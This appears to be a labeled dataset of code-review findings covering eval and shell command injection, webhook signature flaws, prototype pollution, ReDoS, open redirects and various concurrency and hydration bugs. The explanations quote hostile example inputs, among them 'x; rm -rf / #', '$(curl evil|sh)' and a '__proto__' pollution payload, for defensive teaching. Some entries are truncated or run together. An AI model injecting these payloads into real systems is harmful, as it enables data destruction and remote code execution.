findings.body: `evaluate` passes the formula string to `eval`. This breaks ADR-0001. Any caller that forwards user or webhook input can run arbitrary JavaScript on the host. For example, `process.exit()` or `require('child_process')...` would execute. Formulas should go through a parser for the supported grammar.
findings.label: defect:eval

findings.title: Command Injection
findings.body: `execSync` builds a shell command by joining it with `name`. This is forbidden by ADR-0001. A name such as `x; rm -rf / #` or `$(curl evil|sh)` runs arbitrary shell commands. Use `execFile`/`spawn` with an argument array, for example `execFileSync("pdf-render", ["--out", "/tmp/reports", `${name}.pdf`])`. Also validate `name` so it cannot contain path traversal.
findings.label: defect:cmdinj

findings.title: Signature Bypass
findings.body: `WEBHOOK_SECRET` falls back to `""` when it is missing, so startup does not fail. Anyone can then compute a valid HMAC with the empty key and forge webhooks. The signature is also compared with `===` instead of `crypto.timingSafeEqual`, which leaks timing information. Both points violate ADR-0002.
findings.label: defect:timing

notes: Remote code execution: `eval(formula)` in `src/calc.ts` and the concatenated `execSync` command string in `src/export.ts` let attacker-controlled input execute code or shell commands (ADR-0001).
Sensitive information exposure: `src/config.ts` hardcodes a live payments token (`tok_live_...`). This violates ADR-0002. The token should be rotated and loaded from `process.env`.
Webhook forgery: `src/webhook.ts` defaults the HMAC key to `""` and compares the MAC with a non-constant-time `===` (ADR-0002).

Prototype pollution: `mergeSettings` in `src/config.ts` recurses into arbitrary keys. A source parsed from JSON such as `{"__proto__": {"isAdmin": true}}` would pollute `Object.prototype`. Skip `__proto__`, `constructor` and `prototype` keys.

ReDoS: the regex in `isValidEmail` is `/^([a-zA-Z0-9]+\.?)+@example\.com$/`. Its nested quantifiers backtrack catastrophically on inputs like `aaaaaaaaaaaaaaaaaaaaaaaaaaaa!`, which can block the event loop.

findings.title: Remove eval of caller-supplied formula
findings.body:
eval executes arbitrary JavaScript from the formula string, giving remote code execution if any part of it is user-controlled. Number() on the result does not mitigate this.

Suggestion: Use a safe expression parser (e.g. a math expression library or a small hand-written parser) instead of eval.
findings.label: defect:eval

findings.title: Live API token hardcoded in source
findings.body:
A production-looking payments token is committed to the repository. Anyone with repo access can use it, and it stays in git history. It must be treated as compromised.

Suggestion: Revoke and rotate the token, then read it from the environment or a secret manager: process.env.PAYMENTS_API_TOKEN.
findings.label: defect:secret

findings.title: Command injection through shell string concatenation
findings.body:
`name` is concatenated into a shell command run by execSync. Input like `x; rm -rf /` or `$(...)` executes arbitrary commands. It also permits path traversal in the output name.

Suggestion: Use execFileSync("pdf-render", ["--out", "/tmp/reports", `${safeName}.pdf`]) after validating name against /^[A-Za-z0-9_-]+$/.
findings.label: defect:cmdinj

findings.title: Prototype pollution in mergeSettings
findings.body:
Keys such as `__proto__`, `constructor` and `prototype` are not filtered. JSON.parse of untrusted input creates an own `__proto__` key, so `target[key] ??= {}` returns Object.prototype and the recursion writes to it, polluting all objects. Arrays are also merged as objects.

Suggestion: Skip `__proto__`, `constructor` and `prototype` keys, and only recurse when target[key] is an own plain object (Object.hasOwn).
findings.label: defect:protopollution

findings.title: Audit write is not awaited
findings.body:
saveAudit is async but its promise is ignored. A failure becomes an unhandled rejection, and the privilege change completes with no guarantee the audit record exists. promote is also synchronous, so callers cannot wait for the audit.

Suggestion: Make promote async and `await saveAudit(...)`, ideally recording the audit before or atomically with the role change.
findings.label: defect:floating

findings.title: Off-by-one loop reads past end of array
findings.body:
`i <= list.length` makes the last iteration access list[list.length], which is undefined, so `.name` throws a TypeError on every call, including an empty list.

Suggestion: Use `i < list.length` or `return list.map(u => u.name)`.
findings.label: defect:offbyone

findings.title: Race condition in username reservation
findings.body:
The has() check and add() are separated by an await. Two concurrent calls with the same name both pass the check and both return true, so a username can be reserved twice.

Suggestion: Run checkProfanity first, then check and add synchronously with no await between them; or add to the set before awaiting and remove it on failure.
findings.label: defect:race

findings.title: Weak webhook signature verification
findings.body:
The secret defaults to an empty string, so a missing env var silently makes signatures forgeable by anyone. Comparison with === is not constant-time, enabling timing attacks.

Suggestion: Throw at startup if WEBHOOK_SECRET is unset, and compare with crypto.timingSafeEqual on equal-length Buffers (check length first).
findings.label: defect:timing

findings.title: Regex vulnerable to catastrophic backtracking
findings.body:
`([a-zA-Z0-9]+\.?)+` has nested quantifiers with an optional separator, so a long alphanumeric string that fails to match (e.g. no @example.com) takes exponential time and can block the event loop (ReDoS).

Suggestion: Use an unambiguous pattern such as /^[a-zA-Z0-9]+(\.[a-zA-Z0-9]+)*@example\.com$/.
findings.label: defect:redos

findings.title: try/catch cannot catch rejection from un-awaited promise
findings.body:
`return fetchProfile(id)` returns the promise without await, so a rejection occurs after the try block exits and the catch never runs. Errors propagate to the caller instead of yielding undefined.

Suggestion: Use `return await fetchProfile(id);`.
findings.label: defect:returnawait

findings.title: Remove eval on caller-supplied formula
findings.body:
`eval(formula)` executes arbitrary JavaScript with full process privileges. Any user-controlled formula gives remote code execution (read env vars, spawn processes, exfiltrate data).

Suggestion: Use a real expression parser (e.g. a small recursive-descent parser or a vetted library such as expr-eval/mathjs in a restricted scope) instead of eval.
findings.label: defect:eval

findings.title: Hard-coded live payments API token in source
findings.body:
A live-looking payments token is committed to the repository. Anyone with repo access or the built bundle can use it, and it remains in git history even if removed later.

Suggestion: Revoke and rotate the token, then load it from the environment or a secret manager: `export const PAYMENTS_API_TOKEN = process.env.PAYMENTS_API_TOKEN ?? "";` and fail fast if missing.
findings.label: defect:secret

findings.title: Prototype pollution in recursive merge
findings.body:
mergeSettings copies every key from `source` without excluding `__proto__`, `constructor` or `prototype`. With JSON-parsed input like `{"__proto__":{"isAdmin":true}}`, `target["__proto__"] ??= {}` returns Object.prototype and the recursion writes onto it, polluting every object in the process. This can lead to auth bypass or DoS.

Suggestion: Skip dangerous keys: `if (key === "__proto__" || key === "constructor" || key === "prototype") continue;` and/or use `Object.create(null)` targets and `Object.hasOwn` checks. Also arrays are treated as objects and merged by index, which is probably unintended.
findings.label: defect:protopollution

findings.title: Command injection via unsanitized name in execSync
findings.body:
`name` is concatenated into a shell command string. A value like `x; rm -rf /` or `$(curl evil|sh)` executes arbitrary commands. It also permits path traversal (`../../etc/foo`) in the output file name.

Suggestion: Use execFileSync without a shell and validate the name: `execFileSync("pdf-render", ["--out", "/tmp/reports", `${name}.pdf`])` after checking `/^[A-Za-z0-9_-]+$/.test(name)`.
findings.label: defect:cmdinj

findings.title: Privilege escalation has no authorization check and silent no-op
findings.body:
`promote` sets role to admin for any caller-provided `actor` with no verification that the actor is allowed to do this; `actor` is only recorded in the audit log and can be spoofed. If the user does not exist, nothing happens and no error or audit entry is produced. `saveAudit` is also invoked without being awaited or handled, so a failing or async audit write is lost after the role has already changed.

Suggestion: Verify the actor has admin rights before mutating, throw when the user is missing, and write the audit record (awaiting it) before or atomically with the role change.
findings.label: defect:floating

findings.title: try/catch does not catch rejection because promise is not awaited
findings.body:
`return fetchProfile(id)` inside an async function's try block returns the promise without awaiting it, so a rejection bypasses the catch and propagates to the caller. The intended 'return undefined on error' behavior never happens.

Suggestion: Use `return await fetchProfile(id);`.

`reserved.has(name)` is checked, then the function awaits `checkProfanity`, and only afterwards adds the name. Two concurrent calls with the same name both pass the check and both return true, so duplicate reservations succeed.

Suggestion: Run the profanity check first, then do the has/add synchronously with no await in between (or add to the set before awaiting and remove it on failure).

findings.title: Webhook signature check uses empty fallback secret and non-constant-time compare
findings.body:
If WEBHOOK_SECRET is unset the secret silently becomes an empty string, so anyone can compute a valid signature. The `===` comparison on hex strings is not constant-time, enabling timing attacks on the signature.

Suggestion: Throw at startup if the secret is missing, and compare with `timingSafeEqual` on equal-length Buffers (check lengths first).

findings.title: Regex vulnerable to catastrophic backtracking (ReDoS)

`eval(formula)` executes arbitrary JavaScript with the process's privileges. If the formula comes from a user or request, this gives remote code execution (file access, env secrets, child processes). ESLint no-eval flags this line.

findings.title: Hardcoded live payments API token committed to source

A live-looking payments token is in source control. Anyone with repo access, or any bundle that includes this module, can use it. It remains in git history even after removal, so it must be rotated.

findings.title: Prototype pollution in mergeSettings

Keys from `source` are merged without filtering `__proto__`, `constructor` or `prototype`. With JSON.parse'd input such as `{"__proto__":{"isAdmin":true}}`, `target["__proto__"]` resolves to Object.prototype and the recursive call writes onto it, polluting every object in the process. findings.title: Floating saveAudit promise drops audit failures

`saveAudit` is async but not awaited. If it rejects, this becomes an unhandled rejection (which can crash Node), and the privilege escalation to admin has already happened with no audit record. The function also returns before the audit is written. ESLint no-floating-promises flags this.

Suggestion: Make `promote` async and `await saveAudit(...)`, ideally recording the audit before or atomically with the role change, or at minimum `.catch` and log.

Suggestion: `const SECRET = process.env.WEBHOOK_SECRET; if (!SECRET) throw new Error("WEBHOOK_SECRET is required");`

findings.title: Boundary close resolved after content hydration instead of before
findings.body:
Previously the boundary's close was located with `locateFragmentEnd(claim.start)` before `fn()` ran, so the trim target was fixed against pristine SSR DOM.

Now it is resolved in `finally` via `locateClaimedEnd`, which reads `currentHydrationNode` whenever `$fe` is not yet cached. After `fn()` the cursor can rest somewhere other than the slot's own close:
- an inner fragment may have claimed that close as its anchor and moved past it;
- `advanceHydrationNode` may have climbed out of the range.

The new comment in `locateClaimedEnd` admits the cursor "may rest on an enclosing close of the same kind". In that state `locateClaimedEnd` can return, and cache as `claim.start.$fe`, the enclosing range's close. That poisons later `locateEndAnchor` skips.

The walk fallback is also unsafe. Mismatch recovery inside `fn()` can remove nodes from the range. If the slot's own close was removed, the walk from `start` resolves to a later `]`. `trimHydrationBoundary` then deletes SSR nodes that belong to enclosing or sibling content.

Suggestion: Resolve and cache the close before running the content, as the old code did, e.g. `const close = claim.start ? locateEndAnchor(claim.start) : null` before `fn()`, and pass `close` to `trimHydrationBoundary` in `finally`.
findings.label: valid

findings.title: Same slot claim resolved by two different strategies
findings.body:
The same `currentSlotClaim` is resolved in two ways:
- `locateSlotEndAnchor` walks from the open marker (`locateEndAnchor`);
- `planReuseOwnClose` (and the boundary trim) use `locateClaimedEnd`, which trusts the cursor when no cache exists.

Whichever runs first writes `$fe`, and every later call returns that value unconditionally (new early return at hydration.ts:527). If a cursor-based resolution runs first while the cursor sits on a non-matching close of the same kind, both paths then agree on a wrong anchor. The renderVDOMSlot parent/anchor and the deferred-branch anchor would then be computed against the wrong range.

Suggestion: Use the structural walk (`locateEndAnchor`) for the slot claim everywhere. Alternatively, ensure the close is cached by the walk at boundary entry so the cursor heuristic is never the first writer.
findings.label: valid

findings.title: Slot range close is resolved from the cursor after `fn()` instead of before
findings.body:
Previously the boundary's close marker was found by walking from the open marker before `fn()` ran. Now `trimHydrationBoundary` gets `locateClaimedEnd(claim.start)` in `finally`. Unless `$fe` was already cached by an earlier call, this takes the cursor fast path.

After a hydration mismatch where the client consumed more nodes than SSR emitted, the cursor can sit past this slot's close. With nested same-kind ranges (e.g. `<!--]--><!--]-->`), it can rest on an enclosing close. The same happens if `fn()` throws partway through.

The fast path then accepts the enclosing close. `trimHydrationBoundary` trims up to the wrong marker, which can remove sibling or parent-owned SSR nodes and corrupt the hydrated tree. The new comment in `locateClaimedEnd` describes exactly this hazard, but the cache only protects calls made after the first lookup.

Suggestion: Resolve the close once by walking from the open marker before running `fn` (e.g. `const close = claim.start ? locateEndAnchor(claim.start) : null`, which also primes `$fe`). Then call `if (close) trimHydrationBoundary(close)` in `finally`. Alternatively, have `locateClaimedEnd` fall back to the walk whenever the cache is cold and depth cannot be verified.
findings.label: valid

findings.title: Failed close lookups are not cached and get re-walked
findings.body:
`locateEndAnchor` caches `$fe` only when it finds a match. For a malformed or truncated SSR range, every `locateSlotEndAnchor()` call re-walks from the open marker to the end of the sibling list. This happens on each slot render in `renderVDOMSlot` and on each deferred revive, which can make hydration of a mismatched page quadratic.

Suggestion: Memoize the miss on the claim, e.g. store `claim.end = null`, or record a sentinel after the first unsuccessful walk.

findings.title: Boundary close is resolved only after `fn()` may have mutated or aborted the range
findings.body:
The old code located the boundary's close marker before running `fn()`, so the trim always used a range fixed from pristine SSR DOM. The new code resolves it in `finally` through `locateClaimedEnd(claim.start)`, and does so only if `$fe` was never cached by an earlier call.

At that point the cursor reflects whatever `fn()` did. If `fn()` threw, or a mismatch removed or replaced nodes (including `claim.start` or nested markers), two things can go wrong:
- The cursor fast path can pick the wrong close.
- The walk from a detached or relocated `start` can return null or the wrong close.

Either way `trimHydrationBoundary` then trims too much or too little.

Suggestion: Cache the close as soon as it is cheaply knowable. For example, call `locateEndAnchor(claim.start)` once before `fn()` when hydrating, or when the cursor first reaches the close. Alternatively, skip trimming when `fn()` threw.
findings.label: valid

findings.title: Resolve trim boundary before running the slot body
findings.body:
The close used to trim the boundary was previously located before `fn()` ran. It is now computed afterwards with `locateClaimedEnd(claim.start)`, which takes the cursor's position as the close unless `start.$fe` is already cached.

After `fn()`, the cursor can legitimately have moved past this range's close. `trimHydrationBoundary` documents one case: a fragment claims the close as its anchor and the cursor then climbs. If the cursor now rests on an enclosing range end of the same kind, and nothing in the body called `locateSlotEndAnchor`/`locateEndAnchor` to populate the cache, `locateClaimedEnd` can return the enclosing close.

`trimHydrationBoundary` would then pass the wrong close to `cleanupHydrationTail`, which can remove SSR nodes that belong to the parent scope instead of this boundary's unclaimed tail. The new comment in `locateClaimedEnd` describes exactly this hazard, but the `$fe` guard only protects calls made after something has cached the close.

Suggestion: Pin the close before running the body, e.g. call `locateSlotEndAnchor()` (or `locateEndAnchor(claim.start)`) right after `currentSlotClaim = claim` so `$fe` is cached. Then trim with `claim.start ? claim.start.$fe || locateEndAnchor(claim.start) : null`.
findings.label: valid

findings.title: Unguarded null trim
findings.body:
`trimHydrationBoundary` used to run only when a close marker was found (`if (close)`). It is now always called, and receives `null` when `claim.start` is missing or `locateClaimedEnd` finds no close. That happens when the boundary has no SSR range, for example on a hydration mismatch where the opening marker isn't found.

I can't see from the diff whether `trimHydrationBoundary(null)` is a no-op. If it treats `null` as "trim to the end of the parent", which is a common `cleanupHydrationTail` pattern, it could remove unrelated trailing SSR siblings.

Suggested fix: keep the guard, e.g. `const close = claim.start ? locateClaimedEnd(claim.start) : null; if (close) trimHydrationBoundary(close)`. A mismatch test where the slot has no SSR markers would confirm the behavior.

findings.title: Stale cached close
findings.body:
`locateClaimedEnd` now returns the cached `start.$fe` unconditionally. With the lazy approach, `locateSlotEndAnchor` can populate that cache mid-hydration (deferred revival, VDOM slot) through `locateEndAnchor`.

If mismatch handling later removes or replaces that close node, the cached `$fe` would be detached. `planReuseOwnClose` or the boundary trim would then use a node with no `parentNode`. The old code never read a cache here.

Uncertain: this depends on whether the mismatch paths can remove the close node while `$fe` is set. A mismatch test covering deferred revival inside a slot would settle it.

findings.title: Restore null guard before trimming boundary
findings.body:
Previously `trimHydrationBoundary` was only called when a close marker existed (`if (close)`). Now it can receive `null` when there is no SSR range or the close can't be located, which may throw or trim the wrong range. Restore the guard.

Improved code:
const close = claim.start ? locateClaimedEnd(claim.start) : null
if (close) trimHydrationBoundary(close)

findings.title: Avoid cursor-based close lookup for slots
findings.body:
For slots, the old code used a close marker found by walking from the open marker. The new code uses `locateClaimedEnd`, which trusts the cursor whenever nothing is cached. While the slot boundary is still hydrating, the cursor may rest on a nested `]` close, so the wrong anchor can be reused. Use `locateSlotEndAnchor()` for slots, matching its documented contract of never reading off the cursor.

Improved code:
const close =
  frag.__vf & SLOT
    ? locateSlotEndAnchor()
    : frag.hydrationClaim && frag.hydrationClaim.start
      ? locateClaimedEnd(frag.hydrationClaim.start)
      : null

findings.title: Unneeded walk (nit)
findings.body:
This call runs after `scope.run(render)`, so the slot content has already hydrated. Even so, `locateSlotEndAnchor()` always walks from the open marker via `locateEndAnchor`.

By the docs in this PR, the cursor normally rests on the close at this point. `locateClaimedEnd` would usually return it without walking. Using `locateSlotEndAnchor()` here keeps the eager-walk cost the PR is trying to remove, at least on the `!currentParentNode` path.

Suggested fix: expose a variant built on `locateClaimedEnd(claim.start)` for post-content callers. Keep the walking version for the in-progress case in `prepareDeferredHydrationAnchor`.

The old code only trimmed when a close marker was found (`if (close) trimHydrationBoundary(close)`). The new code calls `trimHydrationBoundary` unconditionally, so it can receive `null` when there is no `claim.start` or the close cannot be located. Depending on how `trimHydrationBoundary` handles `null`, this can trim the wrong nodes or throw. Keep the guard so the change stays behavior-preserving.

if (close) trimHydrationBoundary(close)

findings.title: Slot close located via cursor while slot content is still hydrating
findings.body:
For SLOT fragments, `planReuseOwnClose` runs inside the boundary while its content is in progress. It now calls `locateClaimedEnd(claim.start)`, which checks whether the hydration cursor rests on a close marker of the same kind before walking from the start. During hydration the cursor can sit on a nested fragment's `]` or `)`. Unless `$fe` was already cached, that nested close is taken as the slot's own close. The anchor is then reused or created after the wrong marker, and the slot's real close and tail are mis-claimed. The new `locateSlotEndAnchor` doc comment states the opposite rule: 'never read off the cursor'. The old code walked from the open marker up front via `locateFragmentEnd`, so this is a behavior regression.

Suggestion: For slots, use the walk-based locator: `const close = frag.__vf & SLOT ? locateSlotEndAnchor() : (frag.hydrationClaim && frag.hydrationClaim.start ? locateClaimedEnd(frag.hydrationClaim.start) : null)`.

findings.title: Boundary close now resolved after fn() from the moved cursor
findings.body:
The close used to be located before `fn()` by walking from the open marker. It is now resolved in `finally` with `locateClaimedEnd`, which first trusts the cursor if it rests on a same-kind close marker. After `fn()` the cursor may rest on a nested range's close that was left unclaimed. Then `node === close` and `trimHydrationBoundary` becomes a no-op, so the boundary's unclaimed tail is not trimmed. If `fn()` threw, this lookup also runs in `finally`, and any failure in it would mask the original error.

Suggestion: Resolve the close with `locateEndAnchor(claim.start)`, which caches `$fe` and ignores the cursor, instead of `locateClaimedEnd`. Alternatively, resolve it before `fn()` as the old code did.

findings.title: Slot close is resolved from the cursor, not by walking from the open marker
findings.body:
Before the change, a slot's close was computed once up front by `locateFragmentEnd(claim.start)`, so it was independent of the cursor. Now `planReuseOwnClose` uses `locateClaimedEnd(claim.start)` for slots. That function first checks whether `currentHydrationNode` is a matching close and only walks on a mismatch. The new `$fe` early-return in `locateClaimedEnd` only helps once something has already cached the end. If nothing has called `locateEndAnchor` for this claim yet, the cursor may be resting on a nested or enclosing close of the same kind. The cursor shortcut can then return the wrong close, and the anchor gets reused or created after the wrong marker. The new `locateSlotEndAnchor` comment already says the end must be walked to from the open marker and never read off the cursor, but this call site still reads it off the cursor.

Suggestion: For slots, resolve the end with the same walk used by `locateSlotEndAnchor`:

const close = frag.__vf & SLOT
  ? locateSlotEndAnchor()
  : frag.hydrationClaim && frag.hydrationClaim.start
    ? locateClaimedEnd(frag.hydrationClaim.start)
    : null

findings.title: Boundary trim resolves the close from the cursor after the content has run
findings.body:
The `finally` block now calls `locateClaimedEnd(claim.start)` after `fn()` has moved the cursor. If nothing cached `$fe` during `fn()`, the cursor-based shortcut can match an enclosing close of the same kind, which is where the cursor may have drifted. `trimHydrationBoundary` then sees `node === close` and skips trimming, leaving unclaimed SSR nodes in the slot range. If `fn` throws, this extra lookup also runs inside `finally`, where it could mask the original error. The old code captured the close before running `fn`.

Suggestion: Use `locateEndAnchor(claim.start)`, which is cursor-independent and cached, for the trim, or resolve and cache the end before calling `fn()`.

findings.title: Failed end lookups are not cached and are repeated
findings.body:
`locateSlotEndAnchor` is now called on every deferred-branch revival and every VDOM slot render. When the matching close cannot be found (for example malformed SSR markup), `locateEndAnchor` caches nothing, so each call rescans the siblings. The cost is O(n) per call, and n grows with the number of calls.

Suggestion: Cache a negative result on the claim, or compute the end once per boundary and reuse it.

findings.title: Slot close may be read off the cursor when no walk has cached `$fe`
findings.body:
Before this change a slot boundary's close marker was always found by walking from `claim.start`, so it was exact. Now the `finally` trim here and `planReuseOwnClose` (lines 240-242) call `locateClaimedEnd(claim.start)`. That function tries the current hydration cursor first, and the new comment in `hydration.ts` admits the cursor 'may rest on an enclosing close of the same kind'. The only guard is the `$fe` cache, which is populated only if something earlier called `locateSlotEndAnchor`/`locateEndAnchor`. A slot that renders no VDOM interop and has no deferred branch never triggers that walk. In a mismatch or partially consumed slot, the cursor can sit on the parent's close marker. The trim then treats the wrong marker as the slot's end, which can remove or keep the wrong SSR nodes, or anchor a fragment to the enclosing close.

Suggestion: Use the walking locator for slot claims so the result does not depend on cursor position, e.g. `trimHydrationBoundary(claim.start ? locateEndAnchor(claim.start) : null)`. Do the same in `planReuseOwnClose` when `frag.__vf & SLOT`. The result is cached in `$fe`, so repeat calls are cheap.

findings.title: Normalization bypass
findings.body:
`CollapseLeadingSlashes` runs before the code that prepends `/` to relative patterns, and it only acts when the string already starts with `/`. A pattern that starts with a backslash skips normalization, then gets `/` prepended, which recreates the scheme-relative shape.

Example: the IIS rule `url="{R:1}"` with a capture of `\example.com` (or `\\example.com`) becomes `/\example.com`. Browsers treat that as `//example.com`, so the open redirect still works. The same applies to Apache rules like `RewriteRule /legacy/(.*) $1 [R=302]`.

Fix: normalize after the leading `/` is prepended, or make the helper also collapse a leading run that begins with `\`. Add test cases where the target has no leading `/` and the capture starts with `\`.
findings.label: valid

findings.title: Open redirect bypass
findings.body:
`CollapseLeadingSlashes` runs before the code that prepends `/` to relative patterns, so the result of that prepend is never normalized.

Concrete case:
- An IIS rule `url="{R:1}"` captures `\example.com`.
- The helper returns it unchanged, because `url[0] != '/'`.
- The prepend step then turns it into `/\example.com`.
- Browsers treat `/\example.com` as scheme-relative, so the redirect is still open.

Fix: normalize after the prepend, or have the helper also treat a leading `\` as a slash.

`RedirectRule` probably has the same flaw if it uses the same prepend logic. The helper is called before that logic there too, so check it as well.

findings.title: Incomplete normalization
findings.body:
The helper only acts when the string starts with `/`. Leading-backslash inputs pass through unchanged, for example:
- `\\example.com`
- `\/example.com`

Browsers also resolve these off-origin. That means the helper does not fully mirror the predicate in `SharedUrlHelper.IsLocalUrl`, which its comment says it does. In `RewriteAction`, such a value becomes `Request.Path`, where a downstream redirect could emit it.

Consider collapsing any leading run of `/` and `\` to a single `/`, whatever the first character is.

findings.title: Popup Can Go Off-Screen
findings.body:
In `Pointer` mode, once `_hasInitialPosition` is set, later size changes no longer reach the positioner. The positioner's constraint adjustments (flip/slide to stay inside screen bounds) are therefore never re-applied.

Scenario: a context flyout opens near the bottom or right screen edge, then its content grows (async items load, an expander opens). The popup keeps its original anchor and its new area extends off-screen.

The first arrange may also run before content reaches its final size. That locks in a position computed for a smaller popup.

Consider still repositioning when the new bounds would violate screen constraints, or re-running only the constraint adjustment with the original anchor point.

findings.title: Over-broad suppression
findings.body:
After the first positioned arrange, every later size or child-margin change on a `Pointer`-placed popup skips `UpdatePosition()`. The positioner then never re-runs constraint adjustment (flip/slide) and never re-applies anchor and gravity for the new size. Realistic breakages:

findings.title: Race Condition
findings.body:
`Parallel.ForEach` updates the static `Dictionary` `TotalsByCustomer` from multiple threads with a read-modify-write. `Dictionary` is not thread-safe, so concurrent rows can lose updates, corrupt the dictionary, or throw. Any CSV large enough to run rows in parallel can trigger this, especially when several rows share a customer.

Related problems in the same method:
- `async void` means callers cannot await completion. Exceptions from a missing file, malformed rows (`cols[3]` out of range, `decimal.Parse`), or HTTP failures in `ToUsd` go unobserved or crash the process.
- `StreamReader` is never disposed, so the file handle leaks.
- Each parallel row makes a blocking HTTP call through `RateService.ToUsd`. It creates a new `HttpClient` per call and blocks with `.Result`, which risks socket exhaustion and thread-pool starvation.
findings.label: defect:race

findings.title: Overflow Bypasses Cap
findings.body: `1 << attempt` overflows for large attempt counts, so the `d > 30` cap never applies. On 64-bit platforms, `attempt` = 63 yields a negative value and `attempt` >= 64 yields 0. A long-running retry loop that keeps incrementing `attempt` would then wait zero or a negative duration and spin without backoff. A negative `attempt` panics at runtime. Clamp `attempt` before shifting, for example by returning 30 when `attempt >= 5` and treating `attempt < 0` as 0.

findings.title: Shift overflow / panic
findings.body: `1 << attempt` is computed before the cap is applied. For `attempt` of 63, the result is `math.MinInt64`, which is negative and passes the `d > 30` check, so a negative delay is returned. For `attempt` >= 64 the result is 0, so there is no backoff at all. A negative `attempt` panics at runtime. A long-running retry loop would hit these cases and either spin with no delay or pass a negative duration to a sleep. Clamp `attempt` (for example, return 30 once `attempt >= 5`, and treat negatives as 0) before shifting.

findings.title: Datapath/userspace mismatch
findings.body:
The new ID-0 fallback lookup runs only when both the specific and aggregate lookups miss. It also has no counterpart in the Go `mapState.lookup`, which only considers the specific ID and `aggregateFor(key.Identity)`.

Today `aggregateFor` always returns 0, so this branch never runs and nothing changes. Once aggregates become non-zero, the verdict will depend on whether an unrelated specific entry exists:
- If an ID-0 entry is present (for example, one not expanded via `AllAggregates`) and no specific entry matches, the ID-0 entry is applied.
- If any lower-precedence specific entry exists, the same ID-0 entry is ignored, even a higher-precedence deny.

The userspace test `lookup` will not reflect either case. Either drop the fallback and rely on the expansion of ID 0 into `AllAggregates`, or apply the same precedence logic in both places.

findings.title: Performance Regression
findings.body:
Every binary file in a diff is now streamed in full, on both sides, during each render. Previously `IsBin` files returned early, and content sniffing only read `SniffContentSize` bytes.

`getCommitFileBlobAndLimitedContent` calls `GetBlobLineCount`, which reads the entire blob just to count lines and bytes. The limit only caps what is buffered, not what is read. A PR or commit touching large binaries (e.g. archives, videos of hundreds of MB) will read all of that data on every diff page load.

For binaries, read only the sniff prefix and get the size from `blob.Size`, or by another cheap means.

findings.title: Hidden host capabilities
findings.body:
`hostWrapper` embeds `component.Host` as an interface, so only `GetExtensions` (plus the explicitly added `Report`/`RegisterZPages`) is promoted. Any other optional capability on the real service host is lost to extensions.

Extensions find these capabilities with type assertions, so they would now fail. Examples include `GetFactory` (`hostcapabilities.ComponentFactoryProvider`) and `GetModuleInfos` (`hostcapabilities.ModuleInfo`). Extensions that use them, such as an OpAMP-style extension reporting module info, would silently lose that functionality.

Fix: forward these interfaces too, the same way `RegisterZPages` is forwarded. Alternatively, build the wrapper dynamically so it preserves the underlying host's interfaces. Add tests asserting those capabilities still pass through.

findings.title: Unconditional ZPages capability
findings.body:
`hostWrapper` always satisfies the `RegisterZPages` interface, even when the wrapped host does not. In that case the call is a silent no-op.

Extensions that type-assert for this capability to choose a fallback or log a warning will now think zPages registration succeeded when it did nothing. This only matters for hosts that do not implement `RegisterZPages`, such as custom or test hosts.

findings.title: Hidden host capabilities
findings.body:
`hostWrapper` embeds the `component.Host` interface, so only `GetExtensions` is promoted. Any other optional interface implemented by the service host is no longer visible to extensions through type assertions, except `RegisterZPages`, which is forwarded by hand.

Examples are `hostcapabilities.ModuleInfo`, `hostcapabilities.ComponentFactory` and `ExposeExporters`. An extension that type-asserts the host for one of these will now fail the check and silently lose the capability. For example, the OpAMP extension asserts `ModuleInfo` in `Start` to report available components.

Either forward every known host capability, or build the wrapper so it preserves the concrete host's method set. For example, have the service host itself implement a per-instance reporter.

With this change, that assertion now always succeeds and the call silently does nothing. Previously, the extension could detect the missing capability and skip or log it. A typical trigger is running extensions with a custom or test host that lacks `RegisterZPages`.

findings.title: Response body leak
findings.body:
This download request uses a raw `http.Client.Do`, which returns no error for 5xx responses. The callback now returns `(true, nil)` for 500/502/503/504/509 as well as 429, but the body of the failed `res` is never closed before the pacer retries. Each retried server error therefore leaks a response body and its connection. Before this PR the leak only happened on 429; it now happens on the common transient 5xx path.

The callback also returns a nil error even when it asks for a retry. If every low-level retry gets a 5xx, `pacer.Call` returns nil and execution continues with the last error response, unless the code after the hunk checks the status code.

Suggested fix: close `res.Body` when retrying, and return a non-nil error (for example, one built from the status code) whenever `ShouldRetryHTTP` is true.

findings.title: Response body leak on retry
findings.body: In the `Open` download paths, a retryable status such as 502 or 503 returns `true, nil` without closing `res.Body` (or `downloadRes.Body`). Each retry overwrites the response, so the earlier body and its connection are leaked. Retries now fire for 500/502/503/504/509 as well as 429, so this is far more likely to happen. If retries are exhausted, the pacer returns a nil error, and the caller then treats the 5xx response as a successful download. Close the body before returning retry=true, and return an error carrying the status so exhausted retries fail.
